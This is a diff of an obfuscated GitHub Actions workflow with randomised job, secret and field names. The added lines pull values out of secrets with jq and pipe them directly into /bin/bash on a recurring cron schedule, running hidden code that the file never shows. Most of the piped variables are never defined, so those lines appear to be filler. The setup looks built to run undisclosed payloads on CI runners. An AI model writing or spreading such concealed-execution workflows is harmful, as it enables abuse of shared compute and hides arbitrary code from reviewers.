@@ -3,29 +3,31 @@ name: shenjushou7610
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
-jobs:  # 18000
+    - cron: '32 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shenjushou7610
         env:
-          rki1033: ${{ secrets.rki1033 }}
+          n78985: ${{ secrets.n78985 }}
         run: |
-          echo $rki1033 | jq -r .zd37865 | /bin/bash
-          echo $e93 | jq -r .blgw525 | /bin/bash
-          echo $okro9893 | jq -r .luat6 | /bin/bash
-          echo $uhv4 | jq -r .godju98 | /bin/bash
-          echo $pwnii62 | jq -r .yx55 | /bin/bash
-          echo $xyoz6 | jq -r .yze3951 | /bin/bash
-          echo $pbg7 | jq -r .rbryo1 | /bin/bash
-          echo $bpsr0852 | jq -r .toyo65 | /bin/bash
-          echo $gv10531 | jq -r .xone747 | /bin/bash
-          echo $tyd96679 | jq -r .npo3778 | /bin/bash
-          echo $gzhkg7216 | jq -r .bqg8 | /bin/bash
-          echo $nxrea3 | jq -r .tult1 | /bin/bash
-          echo $uq97273 | jq -r .nvc91 | /bin/bash
-          echo $y45528 | jq -r .ep404 | /bin/bash
+          echo $n78985 | jq -r .ik9351 | /bin/bash
+          echo $lsgy763 | jq -r .s32872 | /bin/bash
+          echo $frehb770 | jq -r .u6 | /bin/bash
+          echo $gf98203 | jq -r .aahd248 | /bin/bash
+          echo $m6 | jq -r .ne117 | /bin/bash
+          echo $xlxui3 | jq -r .mkw7444 | /bin/bash
+          echo $hf177 | jq -r .ov467 | /bin/bash
+          echo $xjy710 | jq -r .imt3490 | /bin/bash
+          echo $g67870 | jq -r .fs0776 | /bin/bash
+          echo $azasz392 | jq -r .qorte71396 | /bin/bash
+          echo $vqsn572 | jq -r .ff4950 | /bin/bash
+          echo $onyd4107 | jq -r .o2883 | /bin/bash
+          echo $diahj6 | jq -r .h188 | /bin/bash
+          echo $pc2 | jq -r .mj950 | /bin/bash
+          echo $xzjxq890 | jq -r .bmt169 | /bin/bash
+          echo $ft1218 | jq -r .v667 | /bin/bash
 
